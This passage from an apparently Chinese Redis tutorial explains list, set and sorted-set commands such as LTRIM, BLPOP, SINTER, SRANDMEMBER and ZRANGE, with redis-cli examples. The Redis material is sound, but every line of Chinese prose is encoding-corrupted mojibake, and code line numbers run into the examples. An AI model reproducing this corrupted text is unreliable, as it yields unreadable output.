ä¸ªå€¼ä¸º value çš„å…ƒç´ ã€‚ å½“ count &lt; 0 æ—¶ LREM å‘½ä»¤ä¼šä»åˆ—è¡¨å³è¾¹å¼€å§‹åˆ é™¤å‰ |count| ä¸ªå€¼ä¸º value çš„å…ƒç´ ã€‚ å½“ count = 0 æ˜¯ LREM å‘½ä»¤ä¼šåˆ é™¤æ‰€æœ‰å€¼ä¸º value çš„å…ƒç´ ã€‚ ç¤ºä¾‹ï¼š 1234567891011121314redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"4) "2"# ä»å³è¾¹å¼€å§‹åˆ é™¤ç¬¬ä¸€ä¸ªå€¼ä¸ºâ€2â€œçš„å…ƒç´ redis&gt; LREM numbers -1 2(integer) 1redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0" è·å–ä¸è®¾ç½®æŒ‡å®šç´¢å¼•çš„å…ƒç´ å€¼å¦‚æœè¦å°†åˆ—è¡¨ç±»å‹å½“ä½œæ•°ç»„æ¥ç”¨ï¼ŒLINDEX å‘½ä»¤æ˜¯å¿…ä¸å¯å°‘çš„ã€‚LINDEX å‘½ä»¤ç”¨æ¥è¿”å›æŒ‡å®šç´¢å¼•çš„å…ƒç´ ï¼Œç´¢å¼•ä» 0 å¼€å§‹ã€‚ 123LINDEX key indexLSET key index value ç¤ºä¾‹ï¼š 12345678redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINDEX numbers 1"3" LSET æ˜¯å¦ä¸€ä¸ªé€šè¿‡ç´¢å¼•æ“ä½œåˆ—è¡¨çš„å‘½ä»¤ï¼Œå®ƒä¼šå°†ç´¢å¼•ä¸º index çš„å…ƒç´ èµ‹å€¼ä¸º valueã€‚ 1234567891011redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LSET numbers 1 10OKredis&gt; LINDEX numbers 1"10" åªä¿ç•™åˆ—è¡¨æŒ‡å®šç‰‡æ®µLTRIM å‘½ä»¤å¯ä»¥åˆ é™¤æŒ‡å®šç´¢å¼•èŒƒå›´ä¹‹å¤–çš„æ‰€æœ‰å…ƒç´ ï¼Œå…¶æŒ‡å®šåˆ—è¡¨èŒƒå›´çš„æ–¹æ³•å’Œ LRANGE å‘½ä»¤ç›¸åŒï¼Œå³ä¿ç•™ç´¢å¼•ä» start åˆ° stop ä¹‹é—´çš„æ‰€æœ‰å…ƒç´ ï¼ˆåŒ…å«ä¸¤ç«¯çš„å…ƒç´ ï¼šstartã€stopï¼‰ã€‚ 1LTRIM key start stop ç¤ºä¾‹ï¼š 123456789101112redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LTRIM numbers 1 2OKredis&gt; LRANGE numbers 0 -11) "3"2) "2" LTRIM å‘½ä»¤å¸¸å’Œ LPUSH å‘½ä»¤ä¸€èµ·ä½¿ç”¨æ¥é™åˆ¶åˆ—è¡¨ä¸­å…ƒç´ çš„æ•°é‡ï¼Œæ¯”å¦‚è®°å½•æ—¥å¿—æ—¶å¸Œæœ›åªä¿ç•™æœ€è¿‘çš„ 100 æ¡æ—¥å¿—ï¼Œåˆ™æ¯æ¬¡åŠ å…¥æ–°å…ƒç´ æ—¶è°ƒç”¨ä¸€æ¬¡ LTRIM å‘½ä»¤å³å¯ï¼š 123LPUSH logs $newLogLTRIM logs 0 99 å‘åˆ—è¡¨ä¸­æ’å…¥å…ƒç´ LINSERT å‘½ä»¤é¦–å…ˆä¼šåœ¨åˆ—è¡¨ä¸­ä»å·¦åˆ°å³æŸ¥æ‰¾å€¼ä¸º pivot çš„å…ƒç´ ï¼Œç„¶åæ ¹æ®ç¬¬äºŒä¸ªå‚æ•°æ˜¯ BEFORE è¿˜æ˜¯ AFTER æ¥å†³å®šå°† value æ’å…¥åˆ°è¯¥å…ƒç´ çš„å‰é¢è¿˜æ˜¯åé¢ï¼Œå‘½ä»¤çš„è¿”å›å€¼æ˜¯æ’å…¥ååˆ—è¡¨çš„å…ƒç´ ä¸ªæ•°ã€‚ 1LINSERT key BEFORE|AFTER pivot value ç¤ºä¾‹ï¼š 123456789101112131415redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINSERT numbers after 1 0(integer) 5redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"5) "0" å°†å…ƒç´ ä»ä¸€ä¸ªåˆ—è¡¨è½¬åˆ°å¦ä¸€ä¸ªåˆ—è¡¨RPOPLPUSH æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„å‘½ä»¤ï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºå®ƒçš„åŠŸèƒ½ï¼šå…ˆæ‰§è¡Œ RPOP å‘½ä»¤å†æ‰§è¡Œ LPUSH å‘½ä»¤ã€‚RPOPLPUSH å‘½ä»¤ä¼šå…ˆä» source åˆ—è¡¨ç±»å‹é”®çš„å³è¾¹å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œç„¶åå°†å…¶åŠ å…¥åˆ° destination åˆ—è¡¨ç±»å‹é”®çš„å·¦è¾¹ï¼Œå¹¶è¿”å›è¿™ä¸ªå…ƒç´ çš„å€¼ï¼Œæ•´ä¸ªè¿‡ç¨‹æ˜¯åŸå­çš„ã€‚ 1RPOPLPUSH source destination å½“æŠŠåˆ—è¡¨ç±»å‹ä½œä¸ºé˜Ÿåˆ—ä½¿ç”¨æ—¶ï¼ŒRPOPLPUSH å‘½ä»¤å¯ä»¥å¾ˆç›´è§‚åœ°åœ¨å¤šä¸ªé˜Ÿåˆ—ä¸­ä¼ é€’æ•°æ®ã€‚å½“ source å’Œ destination ç›¸åŒæ—¶ï¼ŒRPOPLPUSH å‘½ä»¤ä¼šä¸æ–­åœ°å°†é˜Ÿå°¾çš„å…ƒç´ ç§»åˆ°é˜Ÿé¦–ï¼Œå€ŸåŠ©è¿™ä¸ªç‰¹æ€§å¯ä»¥å®ç°ä¸€ä¸ªç½‘ç«™ç›‘æ§ç³»ç»Ÿï¼šä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—å­˜å‚¨éœ€è¦ç›‘æ§çš„ç½‘å€ï¼Œç„¶åç›‘æ§ç¨‹åºä¸æ–­åœ°ä½¿ç”¨ RPOPLPUSH å‘½ä»¤å¾ªç¯å–å‡ºä¸€ä¸ªç½‘å€æ¥æµ‹è¯•å¯ç”¨æ€§ã€‚è¿™é‡Œä½¿ç”¨ RPOPLPUSH å‘½ä»¤çš„å¥½å¤„åœ¨äºåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ä»ç„¶å¯ä»¥ä¸æ–­åœ°å‘ç½‘å€åˆ—è¡¨ä¸­åŠ å…¥æ–°ç½‘å€ï¼Œè€Œä¸”æ•´ä¸ªç³»ç»Ÿå®¹æ˜“æ‰©å±•ï¼Œå…è®¸å¤šä¸ªå®¢æˆ·ç«¯åŒæ—¶å¤„ç†é˜Ÿåˆ—ã€‚ åˆ—è¡¨é˜»å¡æ“ä½œBLPOP å‘½ä»¤æ˜¯ LPOP å‘½ä»¤çš„é˜»å¡ç‰ˆæœ¬ï¼Œå½“ç»™å®šåˆ—è¡¨å†…æ²¡æœ‰ä»»ä½•å…ƒç´ å¯ä¾›å¼¹å‡ºçš„æ—¶å€™ï¼ŒRedis è¿æ¥å°†è¢« BLPOP å‘½ä»¤é˜»å¡ï¼Œç›´åˆ°ç­‰å¾…è¶…æ—¶æˆ–å‘ç°å¯å¼¹å‡ºå…ƒç´ ä¸ºæ­¢ã€‚è¶…æ—¶å‚æ•° timeout æ¥å—ä¸€ä¸ªä»¥ç§’ä¸ºå•ä½çš„æ•°å­—ä½œä¸ºå€¼ï¼Œè®¾ä¸º 0 è¡¨ç¤ºé˜»å¡æ—¶é—´å¯ä»¥æ— é™æœŸå»¶è¿Ÿã€‚å½“ç»™å®šå¤šä¸ª Key å‚æ•°æ—¶ï¼ŒBLPOP å‘½ä»¤ä¼šæŒ‰å‚æ•° Key çš„å…ˆåé¡ºåºä¾æ¬¡æ£€æŸ¥å„ä¸ªåˆ—è¡¨ï¼Œå¼¹å‡ºç¬¬ä¸€ä¸ªéç©ºåˆ—è¡¨çš„å¤´å…ƒç´ ï¼Œå¹¶å’Œè¢«å¼¹å‡ºå…ƒç´ æ‰€å±çš„åˆ—è¡¨çš„åå­—ä¸€èµ·ï¼Œç»„æˆç»“æœè¿”å›ç»™è°ƒç”¨è€…ã€‚å¦‚æœæ‰€æœ‰ç»™å®š Key éƒ½ä¸å­˜åœ¨æˆ–åŒ…å«ç©ºåˆ—è¡¨ï¼Œé‚£ä¹ˆ BLPOP å‘½ä»¤å°†é˜»å¡è¿æ¥ç›´åˆ°ç­‰å¾…è¶…æ—¶ï¼Œæˆ–è€…æœ‰å¦ä¸€ä¸ªå®¢æˆ·ç«¯å¯¹ç»™å®š Key çš„ä»»æ„ä¸€ä¸ªæ‰§è¡Œ LPUSH æˆ– RPUSH å‘½ä»¤ä¸ºæ­¢ã€‚BRPOPã€BRPOPLPUSH å‘½ä»¤ä¸ BLPOP å‘½ä»¤ç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ 12345BLPOP key [key ...] timeoutBRPOP key [key ...] timeoutBRPOPLPUSH source destination timeout ç¤ºä¾‹ï¼šå‡è®¾ç°åœ¨æœ‰ job ã€ command å’Œ request ä¸‰ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­ job ä¸å­˜åœ¨ï¼Œ command å’Œ request éƒ½æŒæœ‰éç©ºåˆ—è¡¨ã€‚ 123456789redis&gt; LPUSH command "update system"(integer) 1redis&gt; LPUSH request "visit page"(integer) 1redis&gt; BLPOP job command request 01) "command"2) "update system..." ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒBLPOP å‘½ä»¤è¿”å›çš„å…ƒç´ æ¥è‡ª command åˆ—è¡¨ï¼Œå› ä¸ºå®ƒæ˜¯æŒ‰â€ æŸ¥æ‰¾ job -&gt; æŸ¥æ‰¾ command -&gt; æŸ¥æ‰¾ request â€œè¿™æ ·çš„é¡ºåºï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªéç©ºåˆ—è¡¨ commandã€‚ é›†åˆç±»å‹ï¼ˆSetï¼‰åœ¨é›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸åŒçš„ï¼Œä¸”æ²¡æœ‰é¡ºåºã€‚ä¸€ä¸ªé›†åˆç±»å‹é”®å¯ä»¥å­˜å‚¨è‡³å¤š 2^32 - 1 ä¸ªå­—ç¬¦ä¸²ã€‚é›†åˆç±»å‹ä¸æ•£åˆ—ç±»å‹çš„å¯¹æ¯”å¦‚ä¸‹ï¼š æ¯”è¾ƒå†…å®¹ é›†åˆç±»å‹ åˆ—è¡¨ç±»å‹ å­˜å‚¨å†…å®¹ è‡³å¤š 2^32 - 1 ä¸ªå­—ç¬¦ä¸² è‡³å¤š 2^32 - 1 ä¸ªå­—ç¬¦ä¸² æœ‰åºæ€§ å¦ æ˜¯ å”¯ä¸€æ€§ æ˜¯ å¦ é›†åˆç±»å‹çš„å¸¸ç”¨æ“ä½œæ˜¯å‘é›†åˆä¸­åŠ å…¥æˆ–åˆ é™¤å…ƒç´ ã€åˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨ç­‰ã€‚ç”±äºé›†åˆç±»å‹åœ¨ Redis å†…éƒ¨æ˜¯ä½¿ç”¨å€¼ä¸ºç©ºçš„æ•£åˆ—è¡¨ï¼ˆHash Tableï¼‰å®ç°çš„ï¼Œæ‰€ä»¥è¿™äº›æ“ä½œçš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O (1)ã€‚æœ€æ–¹ä¾¿çš„æ˜¯å¤šä¸ªé›†åˆç±»å‹é”®ä¹‹é—´è¿˜å¯ä»¥è¿›è¡Œå¹¶é›†ã€äº¤é›†å’Œå·®é›†è¿ç®—ã€‚ å¢åŠ ã€åˆ é™¤å…ƒç´ SADD å‘½ä»¤ç”¨æ¥å‘é›†åˆä¸­å¢åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¦‚æœé”®ä¸å­˜åœ¨åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºã€‚å› ä¸ºåœ¨ä¸€ä¸ªé›†åˆä¸­ä¸èƒ½æœ‰ç›¸åŒçš„å…ƒç´ ï¼Œæ‰€ä»¥å¦‚æœè¦åŠ å…¥çš„å…ƒç´ å·²ç»å­˜åœ¨äºé›†åˆä¸­å°±ä¼šå¿½ç•¥è¿™ä¸ªå…ƒç´ ã€‚è¯¥å‘½ä»¤çš„è¿”å›å€¼æ˜¯æˆåŠŸåŠ å…¥çš„å…ƒç´ æ•°é‡ï¼ˆå¿½ç•¥çš„å…ƒç´ ä¸è®¡ç®—åœ¨å†…ï¼‰ã€‚ 1SADD key member [member â€¦] ç¤ºä¾‹ï¼š 12345redis&gt; SADD letters a(integer) 1redis&gt; SADD letters a b c(integer) 2 SREM å‘½ä»¤ç”¨æ¥ä»é›†åˆä¸­åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›åˆ é™¤æˆåŠŸçš„ä¸ªæ•°ã€‚ 1SREM key member [member â€¦] ç¤ºä¾‹ï¼š 12redis&gt; SREM letters b c(integer) 2 è·å–é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ SMEMBERS å‘½ä»¤ä¼šè¿”å›é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ 1SMEMBERS key ç¤ºä¾‹ï¼š 123redis&gt; SMEMBERS letters1) "a"2) "b" åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­åˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­æ˜¯ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦ä¸º O (1) çš„æ“ä½œï¼Œæ— è®ºé›†åˆä¸­æœ‰å¤šå°‘ä¸ªå…ƒç´ ï¼ŒSISMEMBER å‘½ä»¤å§‹ç»ˆå¯ä»¥æå¿«åœ°è¿”å›ç»“æœã€‚å½“å€¼å­˜åœ¨æ—¶ SISMEMBER å‘½ä»¤è¿”å› 1ï¼Œå½“å€¼ä¸å­˜åœ¨æˆ–é”®ä¸å­˜åœ¨æ—¶è¿”å› 0ã€‚ 1SISMEMBER key member ç¤ºä¾‹ï¼š 12redis&gt; SISMEMBER letters a(integer) 1 é›†åˆé—´è¿ç®—é›†åˆé—´è¿ç®—å‘½ä»¤ï¼ˆå·®é›†ã€äº¤é›†ã€å¹¶é›†ï¼‰ï¼š 12345SDIFF key [key ...]SINTER key [key ...]SUNION key [key ...] SDIFF å‘½ä»¤ç”¨æ¥å¯¹å¤šä¸ªé›†åˆæ‰§è¡Œå·®é›†è¿ç®—ã€‚é›†åˆ A ä¸é›†åˆ B çš„å·®é›†è¡¨ç¤ºä¸º Aâˆ’Bï¼Œä»£è¡¨æ‰€æœ‰å±äº A ä¸”ä¸å±äº B çš„å…ƒç´ æ„æˆçš„é›†åˆã€‚ 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SDIFF setA setB1) "1"redis&gt; SDIFF setB setA1) "4" SDIFF å‘½ä»¤è‡ªæŒåŒæ—¶ä¼ å…¥å¤šä¸ªé”®ï¼Œä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè®¡ç®—é¡ºåºæ˜¯å…ˆè®¡ç®— setA ä¸ setB çš„å·®é›†ï¼Œå†è®¡ç®—ç»“æœä¸ setC çš„å·®é›†ã€‚ 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SADD setC 2 3(integer) 2redis&gt; SDIFF setA setB setC1) "1" SINTER å‘½ä»¤ç”¨æ¥å¯¹å¤šä¸ªé›†åˆæ‰§è¡Œäº¤é›†è¿ç®—ã€‚é›†åˆ A ä¸é›†åˆ B çš„äº¤é›†è¡¨ç¤ºä¸º A âˆ© Bï¼Œä»£è¡¨æ‰€æœ‰å±äº A ä¸”å±äº B çš„å…ƒç´ æ„æˆçš„é›†åˆã€‚SINTER åŒæ ·æ”¯æŒåŒæ—¶ä¼ å…¥å¤šä¸ªé”®ã€‚ 123456789redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SINTER setA setB1) "2"2) "3" SUNION å‘½ä»¤ç”¨æ¥å¯¹å¤šä¸ªé›†åˆæ‰§è¡Œå¹¶é›†è¿ç®—ã€‚é›†åˆ A ä¸é›†åˆ B çš„å¹¶é›†è¡¨ç¤ºä¸º A âˆª Bï¼Œä»£è¡¨æ‰€æœ‰å±äº A æˆ–è€…å±äº B çš„å…ƒç´ æ„æˆçš„é›†åˆã€‚SUNION åŒæ ·æ”¯æŒåŒæ—¶ä¼ å…¥å¤šä¸ªé”®ã€‚ 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SUNION setA setB1) "1"2) "2"3) "3"4) "4" è·å–é›†åˆä¸­å…ƒç´ çš„ä¸ªæ•°SCARD å‘½ä»¤ç”¨æ¥è·å¾—é›†åˆä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚ 1SCARD key ç¤ºä¾‹ï¼š 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SCARD setA(integer) 4 è¿›è¡Œé›†åˆè¿ç®—å¹¶å°†ç»“æœå­˜å‚¨12345SDIFFSTORE destination key [key â€¦]SINTERSTORE destination key [key â€¦]SUNIONSTORE destination key [key â€¦] SDIFFSTORE å‘½ä»¤å’Œ SDIFF å‘½ä»¤åŠŸèƒ½ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å‰è€…ä¸ä¼šç›´æ¥è¿”å›è¿ç®—ç»“æœï¼Œè€Œæ˜¯å°†ç»“æœå­˜å‚¨åœ¨ destination é”®ä¸­ã€‚ SDIFFSTORE å‘½ä»¤å¸¸ç”¨äºéœ€è¦è¿›è¡Œå¤šæ­¥é›†åˆè¿ç®—çš„åœºæ™¯ä¸­ï¼Œå¦‚éœ€è¦å…ˆè®¡ç®—å·®é›†å†å°†ç»“æœå’Œå…¶ä»–é”®è®¡ç®—äº¤é›†ã€‚ SINTERSTORE ã€ SUNIONSTORE å‘½ä»¤ä¸ SDIFFSTORE ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚ éšæœºè·å¾—é›†åˆä¸­çš„å…ƒç´ SRANDMEMBER å‘½ä»¤ç”¨æ¥éšæœºä»é›†åˆä¸­è·å–ä¸€ä¸ªå…ƒç´ ï¼Œè¿˜å¯ä»¥ä¼ é€’ count å‚æ•°æ¥ä¸€æ¬¡éšæœºè·å¾—å¤šä¸ªå…ƒç´ ã€‚æ ¹æ® count çš„æ­£è´Ÿä¸åŒï¼ŒSRANDMEMBER å‘½ä»¤çš„å…·ä½“è¡¨ç°ä¹Ÿä¸åŒï¼š å½“ count ä¸ºæ­£æ•°æ—¶ï¼ŒSRANDMEMBER ä¼šéšæœºä»é›†åˆé‡Œè·å¾— count ä¸ªä¸é‡å¤çš„å…ƒç´ ã€‚å¦‚æœ count çš„å€¼å¤§äºé›†åˆä¸­çš„å…ƒç´ ä¸ªæ•°ï¼Œåˆ™ SRANDMEMBER ä¼šè¿”å›é›†åˆä¸­çš„å…¨éƒ¨å…ƒç´ ã€‚ å½“ count ä¸ºè´Ÿæ•°æ—¶ï¼ŒSRANDMEMBER ä¼šéšæœºä»é›†åˆé‡Œè·å¾— |count| ä¸ªçš„å…ƒç´ ï¼Œè¿™äº›å…ƒç´ æœ‰å¯èƒ½ç›¸åŒã€‚ SRANDMEMBER å‘½ä»¤è¿”å›çš„ç»“æœå¹¶ä¸æ˜¯éå¸¸éšæœºçš„ï¼Œæ ¹æœ¬åŸå› æ˜¯ç”±é›†åˆç±»å‹çš„å­˜å‚¨ç»“æ„ï¼ˆHash Tableï¼‰å†³å®šçš„ï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦ç»†è§£é‡Š 1SRANDMEMBER key [count] ç¤ºä¾‹ï¼š 123456789101112131415161718192021redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SRANDMEMBER setA"b"redis&gt; SRANDMEMBER setA 11) "c"redis&gt; SRANDMEMBER setA -21) "c"2) "c"redis&gt; SRANDMEMBER setA 51) "b"2) "a"3) "d"4) "c" ä»é›†åˆä¸­å¼¹å‡ºä¸€ä¸ªå…ƒç´ ç”±äºé›†åˆç±»å‹çš„å…ƒç´ æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥ SPOP å‘½ä»¤ä¼šä»é›†åˆä¸­éšæœºé€‰æ‹©ä¸€ä¸ªå…ƒç´ å¼¹å‡ºã€‚ 1SPOP key ç¤ºä¾‹ï¼š 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SPOP setA"c" æœ‰åºé›†åˆç±»å‹ï¼ˆSorted Setï¼‰åœ¨é›†åˆç±»å‹çš„åŸºç¡€ä¸Šæœ‰åºé›†åˆç±»å‹ä¸ºé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å…³è”äº†ä¸€ä¸ªåˆ†æ•°ï¼Œè¿™ä½¿å¾—ä¸ä»…å¯ä»¥å®Œæˆæ’å…¥ã€åˆ é™¤å’Œåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨ç­‰é›†åˆç±»å‹æ”¯æŒçš„æ“ä½œï¼Œè¿˜èƒ½å¤Ÿè·å¾—åˆ†æ•°æœ€é«˜ï¼ˆæˆ–æœ€ä½ï¼‰çš„å‰ N ä¸ªå…ƒç´ ã€è·å¾—æŒ‡å®šåˆ†æ•°èŒƒå›´å†…çš„å…ƒç´ ç­‰ä¸åˆ†æ•°æœ‰å…³çš„æ“ä½œã€‚è™½ç„¶é›†åˆä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯å®ƒä»¬çš„åˆ†æ•°å´å¯ä»¥ç›¸åŒã€‚ æœ‰åºé›†åˆç±»å‹å’Œåˆ—è¡¨ç±»å‹çš„ç›¸åŒç‚¹ï¼š éƒ½æ˜¯æœ‰åºçš„ éƒ½å¯ä»¥è·å¾—æŸä¸€èŒƒå›´çš„å…ƒç´  æœ‰åºé›†åˆç±»å‹å’Œåˆ—è¡¨ç±»å‹çš„ä¸åŒç‚¹ï¼š åˆ—è¡¨ç±»å‹æ˜¯é€šè¿‡åŒå‘é“¾è¡¨å®ç°çš„ï¼Œè·å–é è¿‘ä¸¤ç«¯çš„æ•°æ®é€Ÿåº¦æå¿«ï¼Œè€Œå½“å…ƒç´ å¢å¤šåï¼Œè®¿é—®ä¸­é—´æ•°æ®çš„é€Ÿåº¦ä¼šè¾ƒæ…¢ï¼Œæ‰€ä»¥å®ƒæ›´åŠ é€‚åˆå®ç°å¦‚ â€œæ–°é²œäº‹â€ æˆ– â€œæ—¥å¿—â€ è¿™æ ·å¾ˆå°‘è®¿é—®ä¸­é—´å…ƒç´ çš„åº”ç”¨ æœ‰åºé›†åˆç±»å‹æ˜¯ä½¿ç”¨æ•£åˆ—è¡¨ï¼ˆHash Tableï¼‰å’Œè·³è·ƒè¡¨ï¼ˆSkip Listï¼‰å®ç°çš„ï¼Œæ‰€ä»¥å³ä½¿è¯»å–ä½äºä¸­é—´éƒ¨åˆ†çš„æ•°æ®é€Ÿåº¦ä¹Ÿå¾ˆå¿«ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O (log (N)) åˆ—è¡¨ä¸­ä¸èƒ½ç®€å•åœ°è°ƒæ•´æŸä¸ªå…ƒç´ çš„ä½ç½®ï¼Œä½†æ˜¯æœ‰åºé›†åˆå¯ä»¥ï¼ˆé€šè¿‡æ›´æ”¹è¿™ä¸ªå…ƒç´ çš„åˆ†æ•°ï¼‰ æœ‰åºé›†åˆè¦æ¯”åˆ—è¡¨ç±»å‹æ›´è€—è´¹å†…å­˜ å¢åŠ å…ƒç´ ZADD å‘½ä»¤ç”¨æ¥å‘æœ‰åºé›†åˆä¸­åŠ å…¥ä¸€ä¸ªå…ƒç´ å’Œè¯¥å…ƒç´ çš„åˆ†æ•°ï¼Œå¦‚æœè¯¥å…ƒç´ å·²ç»å­˜åœ¨åˆ™ä¼šç”¨æ–°çš„åˆ†æ•°æ›¿æ¢åŸæœ‰çš„åˆ†æ•°ã€‚ZADD å‘½ä»¤çš„è¿”å›å€¼æ˜¯æ–°åŠ å…¥åˆ°é›†åˆä¸­çš„å…ƒç´ ä¸ªæ•°ï¼ˆä¸åŒ…å«ä¹‹å‰å·²ç»å­˜åœ¨çš„å…ƒç´ ï¼‰ã€‚ 1ZADD key score member [score member â€¦] ç¤ºä¾‹ï¼š 12345redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZADD scoreboard 80 Peter(integer) 0 åˆ†æ•°ä¸ä»…å¯ä»¥æ˜¯æ•´æ•°ï¼Œè¿˜æ”¯æŒåŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œå…¶ä¸­ +inf å’Œ -inf åˆ†åˆ«è¡¨ç¤ºæ­£æ— ç©·å’Œè´Ÿæ— ç©·ã€‚ 1234567891011redis&gt; ZADD testboard 17E+307 a(integer) 1redis&gt; ZADD testboard 1.5 b(integer) 1redis&gt; ZADD testboard `+inf`c(integer) 1redis&gt; ZADD testboard `-inf` d(integer) 1 è·å–å…ƒç´ çš„åˆ†æ•°1ZSCORE key member ç¤ºä¾‹ï¼š 12redis&gt; ZSCORE scoreboard Tom"89" è·å¾—æ’ååœ¨æŸä¸ªèŒƒå›´çš„å…ƒç´ åˆ—è¡¨ZRANGE å‘½ä»¤ä¼šæŒ‰ç…§å…ƒç´ åˆ†æ•°ä»å°åˆ°å¤§çš„é¡ºåºè¿”å›ç´¢å¼•ä» start åˆ° stop ä¹‹é—´çš„æ‰€æœ‰å…ƒç´ ï¼ˆåŒ…å«ä¸¤ç«¯çš„å…ƒç´ ï¼šstartã€stopï¼‰ã€‚ZRANGE å‘½ä»¤ä¸ LRANGE å‘½ä»¤ååˆ†ç±»ä¼¼ï¼Œå¦‚ç´¢å¼•éƒ½æ˜¯ä» 0 å¼€å§‹ï¼Œè´Ÿæ•°ä»£è¡¨ä»åå‘å‰æŸ¥æ‰¾ï¼ˆâˆ’1 è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´ ï¼‰ã€‚ 123ZRANGE key start stop [WITHSCORES]ZREVRANGE key start stop [WITHSCORES] ç¤ºä¾‹ï¼š 1234567891011redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGE scoreboard 0 21) "Peter"2) "Tom"3) "Jim"redis&gt; ZRANGE scoreboard 1 -11) "Tom"2) "Jim" å¦‚æœéœ€è¦åŒæ—¶è·å¾—å…ƒç´ çš„åˆ†æ•°çš„è¯ï¼Œå¯ä»¥åœ¨ ZRANGE å‘½ä»¤çš„å°¾éƒ¨åŠ ä¸Š WITHSCORES å‚æ•°ï¼š 1234567redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES1) "Peter"2) "67"3) "Tom"4) "89"5) "Jim"6) "100" ZRANGE å‘½ä»¤çš„æ—¶é—´å¤æ‚åº¦ä¸º O (log n+m)ï¼Œå…¶ä¸­ n ä¸ºæœ‰åºé›†åˆçš„åŸºæ•°ï¼Œm ä¸ºè¿”å›çš„å…ƒç´ ä¸ªæ•°ã€‚å¦‚æœä¸¤ä¸ªå…ƒç´ çš„åˆ†æ•°ç›¸åŒï¼ŒRedis ä¼šæŒ‰ç…§å­—å…¸é¡ºåºï¼ˆå³ 0 &lt; 9 &lt; A &lt; Z &lt; a &lt; z çš„é¡ºåºï¼‰æ¥è¿›è¡Œæ’åˆ—ã€‚å¦‚æœå…ƒç´ çš„å€¼æ˜¯ä¸­æ–‡ï¼Œé‚£ä¹ˆæ’åˆ—é¡ºåºå–å†³äºä¸­æ–‡çš„ç¼–ç æ–¹å¼ï¼Œä¾‹å¦‚ä½¿ç”¨ UTF-8 ç¼–ç æ—¶æ’åˆ—é¡ºåºå¦‚ä¸‹ï¼Œå¯è§æ­¤æ—¶ Redis ä¾ç„¶æ˜¯æŒ‰ç…§å­—å…¸é¡ºåºæ’åˆ—è¿™äº›å…ƒç´ ã€‚ 12345678redis&gt; ZADD chineseName 0 é©¬å 0 åˆ˜å¢‰ 0 å¸é©¬å…‰ 0 èµµå“²(integer) 4redis&gt; ZRANGE chineseName 0 -11) "\\xe5\\x88\\x98\\xe5\\xa2\\x89"2) "\\xe5\\x8f\\xb8\\xe9\\xa9\\xac\\xe5\\x85\\x89"3) "\\xe8\\xb5\\xb5\\xe5\\x93\\xb2"4) "\\xe9\\xa9\\xac\\xe5\\x8d\\x8e" ZREVRANGE å‘½ä»¤ä¸ ZRANGE å‘½ä»¤çš„å”¯ä¸€ä¸åŒåœ¨äº ZREVRANGE å‘½ä»¤æ˜¯æŒ‰ç…§å…ƒç´ çš„åˆ†æ•°ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºç»“æœã€‚ 1234567redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES1) "Jim"2) "100"3) "Tom"4) "89"5) "Peter"6) "67" è·å¾—æŒ‡å®šåˆ†æ•°èŒƒå›´çš„å…ƒç´ ZRANGEBYSCORE 